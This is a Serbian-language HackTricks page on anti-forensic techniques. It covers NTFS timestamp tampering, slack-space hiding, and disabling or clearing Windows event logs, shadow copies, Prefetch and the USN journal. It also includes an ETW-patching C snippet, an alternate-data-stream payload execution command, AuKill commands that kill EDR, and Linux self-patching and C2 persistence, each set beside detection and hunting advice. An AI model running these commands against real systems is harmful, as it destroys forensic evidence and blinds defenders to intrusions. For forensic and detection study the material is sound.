# Anti-forenzičke tehnike

{{#include ../../banners/hacktricks-training.md}}

## Vremenske oznake

Napadač može biti zainteresovan za **promenu vremenskih oznaka datoteka** kako bi izbegao otkrivanje.\
Vremenske oznake je moguće pronaći unutar MFT-a u atributima `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.

Oba atributa imaju 4 vremenske oznake: **izmena**, **pristup**, **kreiranje** i **izmena MFT registra** (MACE ili MACB).

**Windows explorer** i drugi alati prikazuju informacije iz atributa **`$STANDARD_INFORMATION`**.

### TimeStomp - Anti-forensic Tool

Ovaj alat **menja informacije o vremenskim oznakama unutar** **`$STANDARD_INFORMATION`**, ali **ne** i informacije unutar **`$FILE_NAME`**. Zato je moguće **identifikovati** **sumnjivu** **aktivnost**.

### Usnjrnl

**USN Journal** (Update Sequence Number Journal) je funkcija NTFS-a (Windows NT file system) koja prati promene na volumenu. Alat [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) omogućava ispitivanje ovih promena.

![TimeStomp - Anti-forensic Tool - Usnjrnl: USN Journal (Update Sequence Number Journal) je funkcija NTFS-a (Windows NT file system) koja prati promene na volumenu. ...](<../../images/image (801).png>)

Prethodna slika prikazuje **izlaz** alata, gde se može videti da su na datoteci izvršene određene **promene**.

### $LogFile

**Sve promene metapodataka na file system-u se beleže** u procesu poznatom kao [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Zabeleženi metapodaci čuvaju se u datoteci pod nazivom `**$LogFile**`, koja se nalazi u root direktorijumu NTFS file system-a. Alati kao što je [LogFileParser](https://github.com/jschicht/LogFileParser) mogu se koristiti za parsiranje ove datoteke i identifikovanje promena.

![Usnjrnl - $LogFile: Sve promene metapodataka na file system-u se beleže u procesu poznatom kao write-ahead logging. Zabeleženi metapodaci čuvaju se u datoteci pod nazivom $LogFile, koja se nalazi u root...](<../../images/image (137).png>)

I ovde je u izlazu alata moguće videti da su izvršene **određene promene**.

Korišćenjem istog alata moguće je identifikovati **kada su vremenske oznake izmenjene**:

![Usnjrnl - $LogFile: Korišćenjem istog alata moguće je identifikovati kada su vremenske oznake izmenjene](<../../images/image (1089).png>)

- CTIME: Vreme kreiranja datoteke
- ATIME: Vreme izmene datoteke
- MTIME: Izmena MFT registra datoteke
- RTIME: Vreme pristupa datoteci

### Poređenje `$STANDARD_INFORMATION` i `$FILE_NAME`

Drugi način za identifikovanje sumnjivo izmenjenih datoteka jeste poređenje vremena u oba atributa, uz traženje **nepodudarnosti**.

### Nanosekunde

Vremenske oznake sistema **NTFS** imaju **preciznost** od **100 nanosekundi**. Zato je pronalaženje datoteka sa vremenskim oznakama kao što je 2010-10-10 10:10:**00.000:0000 veoma sumnjivo**.

### SetMace - Anti-forensic Tool

Ovaj alat može izmeniti oba atributa, `$STARNDAR_INFORMATION` i `$FILE_NAME`. Međutim, od sistema Windows Vista, neophodno je da se ova informacija izmeni iz aktivnog OS-a.

## Skrivanje podataka

NFTS koristi klaster i minimalnu veličinu informacija. To znači da, ako datoteka zauzima jedan i po klaster, **preostala polovina se nikada neće koristiti** sve dok se datoteka ne obriše. Zato je moguće **sakriti podatke u ovom slack prostoru**.

Postoje alati kao što je slacker, koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka `$logfile` i `$usnjrnl` može pokazati da su neki podaci dodati:

![SetMace - Anti-forensic Tool - Skrivanje podataka: Postoje alati kao što je slacker, koji omogućavaju skrivanje podataka u ovom „skrivenom“ prostoru. Međutim, analiza datoteka $logfile i $usnjrnl može pokazati da su neki...](<../../images/image (1060).png>)

Slack prostor je zatim moguće preuzeti pomoću alata kao što je FTK Imager. Imajte na umu da ova vrsta alata može sačuvati sadržaj u obfuskovanom ili čak enkriptovanom obliku.

## UsbKill

Ovo je alat koji će **isključiti računar ako se otkrije bilo kakva promena na USB** portovima.\
Jedan od načina za otkrivanje ovoga jeste pregled pokrenutih procesa i **provera svake pokrenute Python skripte**.

## Live Linux distribucije

Ove distribucije se **izvršavaju u RAM** memoriji. Jedini način da se otkriju jeste **ako je NTFS file-system montiran sa dozvolama za upis**. Ako je montiran samo sa dozvolama za čitanje, upad neće moći da se otkrije.

## Secure Deletion

[https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)

## Windows konfiguracija

Moguće je onemogućiti nekoliko Windows metoda logovanja kako bi se forenzička istraga znatno otežala.

### Onemogućavanje vremenskih oznaka - UserAssist

Ovo je registry ključ koji održava datume i vremena kada je korisnik pokrenuo svaku izvršnu datoteku.

Onemogućavanje funkcije UserAssist zahteva dva koraka:

1. Postavite dva registry ključa, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` i `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, na nulu kako biste signalizirali da želimo da UserAssist bude onemogućen.
2. Obrišite registry podstabla koja izgledaju kao `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.

### Onemogućavanje vremenskih oznaka - Prefetch

Ovo čuva informacije o aplikacijama koje su izvršene sa ciljem poboljšanja performansi Windows sistema. Međutim, te informacije mogu biti korisne i za forenzičke prakse.

- Pokrenite `regedit`
- Izaberite putanju datoteke `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
- Kliknite desnim tasterom miša na `EnablePrefetcher` i `EnableSuperfetch`
- Izaberite Modify za svaku od ovih vrednosti i promenite vrednost sa 1 (ili 3) na 0
- Restartujte računar

### Onemogućavanje vremenskih oznaka - vreme poslednjeg pristupa

Kad god se folder otvori sa NTFS volumena na Windows NT serveru, sistem beleži vreme kako bi **ažurirao polje vremenske oznake u svakom navedenom folderu**, koje se naziva vreme poslednjeg pristupa. Na intenzivno korišćenom NTFS volumenu to može uticati na performanse.

1. Otvorite Registry Editor (Regedit.exe).
2. Idite na `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
3. Pronađite `NtfsDisableLastAccessUpdate`. Ako ne postoji, dodajte ovaj DWORD i postavite njegovu vrednost na 1, čime će proces biti onemogućen.
4. Zatvorite Registry Editor i restartujte server.

### Brisanje USB istorije

Svi **USB Device Entries** čuvaju se u Windows Registry-u, u registry ključu **USBSTOR**, koji sadrži podključeve koji se kreiraju svaki put kada priključite USB Device na PC ili Laptop. Ovaj ključ možete pronaći ovde: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Brisanjem ovog ključa** obrisaćete USB istoriju.\
Možete koristiti i alat [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) kako biste bili sigurni da ste ih obrisali (i da biste ih obrisali).

Druga datoteka koja čuva informacije o USB uređajima jeste datoteka `setupapi.dev.log` unutar `C:\Windows\INF`. I nju treba obrisati.

### Onemogućavanje Shadow Copies

**Izlistajte** shadow copies pomoću komande `vssadmin list shadowstorage`\
**Obrišite** ih pokretanjem komande `vssadmin delete shadow`

Možete ih obrisati i putem GUI-ja, prateći korake predložene na [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)

Da biste onemogućili shadow copies, pratite [ove korake](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):

1. Otvorite program Services tako što ćete nakon klika na Windows start dugme u polje za pretragu teksta uneti „services“.
2. Na listi pronađite „Volume Shadow Copy“, izaberite ga i otvorite Properties klikom desnim tasterom miša.
3. U padajućem meniju „Startup type“ izaberite Disabled, a zatim potvrdite promenu klikom na Apply i OK.

Takođe je moguće izmeniti konfiguraciju koja određuje koje će datoteke biti kopirane u shadow copy-ju, u registry ključu `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`

### Prepisivanje obrisanih datoteka

- Možete koristiti **Windows alat**: `cipher /w:C` Ovo će naložiti alatu cipher da ukloni sve podatke iz dostupnog neiskorišćenog prostora na disku C.
- Možete koristiti i alate kao što je [**Eraser**](https://eraser.heidi.ie)

### Brisanje Windows event logova

- Windows + R --> eventvwr.msc --> Proširite „Windows Logs“ --> Kliknite desnim tasterom miša na svaku kategoriju i izaberite „Clear Log“
- `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
- `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`

### Onemogućavanje Windows event logova

- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
- U odeljku services onemogućite servis „Windows Event Log“
- `WEvtUtil.exec clear-log` ili `WEvtUtil.exe cl`

### Onemogućavanje `$UsnJrnl`

- `fsutil usn deletejournal /d c:`

---

## Advanced Logging & Trace Tampering (2023-2025)

### PowerShell ScriptBlock/Module Logging

Novije verzije sistema Windows 10/11 i Windows Server čuvaju **detaljne PowerShell forenzičke artefakte** u okviru
`Microsoft-Windows-PowerShell/Operational` (događaji 4104/4105/4106).
Napadači ih mogu onemogućiti ili obrisati u toku rada:
```powershell
# Turn OFF ScriptBlock & Module logging (registry persistence)
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force

# In-memory wipe of recent PowerShell logs
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
Remove-WinEvent               # requires admin & Win11 23H2+
```
Branioci bi trebalo da prate promene tih ključeva registra i uklanjanje velikog broja PowerShell događaja.

### ETW (Event Tracing for Windows) Patch

Proizvodi za bezbednost endpointa u velikoj meri zavise od ETW-a. Popularna metoda za izbegavanje detekcije iz 2024. godine jeste da se u memoriji zakrpe `ntdll!EtwEventWrite`/`EtwEventWriteFull`, tako da svaki ETW poziv vrati `STATUS_SUCCESS` bez emitovanja događaja:<sup>[[5]](#references)</sup>
```c
// 0xC3 = RET on x64
unsigned char patch[1] = { 0xC3 };
WriteProcessMemory(GetCurrentProcess(),
GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
patch, sizeof(patch), NULL);
```
Javni PoC-ovi (npr. `EtwTiSwallow`) implementiraju isti primitiv u PowerShell-u ili C++-u.
Pošto je patch **lokalan za proces**, EDR-ovi koji rade unutar drugih procesa mogu da ga ne detektuju.<sup>[[5]](#references)</sup>
Detekcija: uporediti `ntdll` u memoriji sa verzijom na disku ili postaviti hook pre user-mode-a.

### Revitalizacija Alternate Data Streams (ADS)

Malware kampanje iz 2023. godine (npr. **FIN12** loader-i) primećene su kako smeštaju binarne fajlove druge faze
unutar ADS-a kako bi ostali van domašaja tradicionalnih skenera:
```cmd
rem Hide cobalt.bin inside an ADS of a PDF
type cobalt.bin > report.pdf:win32res.dll
rem Execute directly
wmic process call create "cmd /c report.pdf:win32res.dll"
```
Enumerišite stream-ove pomoću `dir /R`, `Get-Item -Stream *` ili Sysinternals alata `streams64.exe`.
Kopiranje host fajla na FAT/exFAT ili putem SMB-a ukloniće skriveni stream i može se koristiti
da istražitelji povrate payload.

### BYOVD & „AuKill“ (2023)

Bring-Your-Own-Vulnerable-Driver se sada rutinski koristi za **anti-forensics** tokom ransomware
upada.
Open-source alat **AuKill** učitava potpisan, ali ranjiv driver (`procexp152.sys`) kako bi
suspendovao ili prekinuo EDR i forenzičke senzore **pre enkripcije i uništavanja logova**:<sup>[[1]](#references)</sup>
```cmd
AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
AuKill.exe -k CrowdStrike
```
Drajver se nakon toga uklanja, ostavljajući minimalne artefakte.<sup>[[1]](#references)</sup>
Mere zaštite: omogućite Microsoft vulnerable-driver blocklist (HVCI/SAC)
i generišite upozorenje pri kreiranju kernel servisa iz putanja u koje korisnik može da upisuje.

---

## Linux Anti-Forensics: Self-Patching and Cloud C2 (2023–2025)

### Self‑patching kompromitovanih servisa radi smanjenja detekcije (Linux)
Napadači sve češće „self‑patchuju“ servis neposredno nakon njegovog iskorišćavanja kako bi sprečili ponovnu eksploataciju i potisnuli detekcije zasnovane na ranjivostima. Ideja je da se ranjive komponente zamene najnovijim legitimnim upstream binarnim datotekama/JAR-ovima, tako da skeneri prijave da je host zakrpljen, dok persistence i C2 ostaju aktivni.<sup>[[3]](#references)</sup>

Primer: Apache ActiveMQ OpenWire RCE (CVE‑2023‑46604).<sup>[[3]](#references)[[4]](#references)</sup>
- Nakon eksploatacije, napadači su preuzeli legitimne JAR-ove sa Maven Central (repo1.maven.org), obrisali ranjive JAR-ove iz ActiveMQ instalacije i ponovo pokrenuli broker.
- Time je početni RCE zatvoren, dok su drugi foothold-i ostali aktivni (cron, izmene SSH konfiguracije, zasebni C2 implantati).

Operativni primer (ilustrativno)
```bash
# ActiveMQ install root (adjust as needed)
AMQ_DIR=/opt/activemq
cd "$AMQ_DIR"/lib

# Fetch patched JARs from Maven Central (versions as appropriate)
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar

# Remove vulnerable files and ensure the service uses the patched ones
rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
ln -sf activemq-client-5.18.3.jar activemq-client.jar
ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar

# Apply changes without removing persistence
systemctl restart activemq || service activemq restart
```
Forensic/hunting saveti
- Pregledajte direktorijume servisa zbog neplaniranih zamena binary/JAR fajlova:
- Debian/Ubuntu: `dpkg -V activemq` i uporedite hash-eve/putanje fajlova sa repo mirror-ima.
- RHEL/CentOS: `rpm -Va 'activemq*'`
- Potražite JAR verzije prisutne na disku koje nisu u vlasništvu package manager-a ili symbolic link-ove ažurirane van predviđenog procesa.
- Timeline: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` za korelaciju ctime/mtime sa periodom kompromitacije.
- Shell history/process telemetry: dokaze o korišćenju `curl`/`wget` ka `repo1.maven.org` ili drugim artifact CDN-ovima neposredno nakon početne eksploatacije.
- Change management: proverite ko je primenio “patch” i zašto, a ne samo da je patched verzija prisutna.

### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
Uočeni tradecraft kombinovao je više dugotrajnih C2 putanja i anti-analysis pakovanje:<sup>[[3]](#references)</sup>
- Password-protected PyInstaller ELF loader-i za otežavanje sandboxing-a i static analysis-a (npr. encrypted PYZ, privremena ekstrakcija pod `/_MEI*`).
- Indicators: `strings` rezultati kao što su `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`.
- Runtime artifacts: ekstrakcija u `/tmp/_MEI*` ili prilagođene `--runtime-tmpdir` putanje.
- Dropbox-backed C2 koji koristi hardcoded OAuth Bearer tokens
- Network markers: `api.dropboxapi.com` / `content.dropboxapi.com` sa `Authorization: Bearer <token>`.
- Hunt u proxy/NetFlow/Zeek/Suricata podacima za outbound HTTPS ka Dropbox domenima sa server workload-ova koji uobičajeno ne sinhronizuju fajlove.
- Parallel/backup C2 putem tunneling-a (npr. Cloudflare Tunnel `cloudflared`), čime se zadržava kontrola ako je jedan kanal blokiran.
- Host IOCs: `cloudflared` procesi/jedinice, config na `~/.cloudflared/*.json`, outbound 443 ka Cloudflare edge-ovima.

### Persistence and “hardening rollback” to maintain access (Linux examples)
Napadači često kombinuju self-patching sa trajnim access putanjama:<sup>[[3]](#references)</sup>
- Cron/Anacron: izmene `0anacron` stub-a u svakom `/etc/cron.*/` direktorijumu radi periodičnog izvršavanja.
- Hunt:
```bash
for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
```
- SSH configuration hardening rollback: omogućavanje root login-a i izmena default shell-ova za low-privileged account-e.
- Hunt for root login enablement:
```bash
grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
# flag values like "yes" or overly permissive settings
```
- Hunt for suspicious interactive shell-ove na system account-ima (npr. `games`):
```bash
awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
```
- Random, short-named beacon artifacts (8 alphabetical chars) spušteni na disk koji takođe kontaktiraju cloud C2:
- Hunt:
```bash
find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
```

Defenders treba da korelišu ove artifacts sa eksternom izloženošću i događajima patching-a servisa kako bi otkrili anti-forensic self-remediation korišćen za prikrivanje početne eksploatacije.

## References

- [1] [Sophos X-Ops – AuKill: Weaponized Vulnerable Driver za onemogućavanje EDR-a (mart 2023)](https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr)
- [2] [Red Canary – Patching EtwEventWrite za stealth: detekcija i hunting (jun 2024)](https://redcanary.com/blog/etw-patching-detection)
- [3] [Red Canary – Patching za persistence: Kako se DripDropper Linux malware kreće kroz cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
- [4] [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
- [5] [Hiding Your .NET - ETW (Adam Chester / XPN)](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
{{#include ../../banners/hacktricks-training.md}}
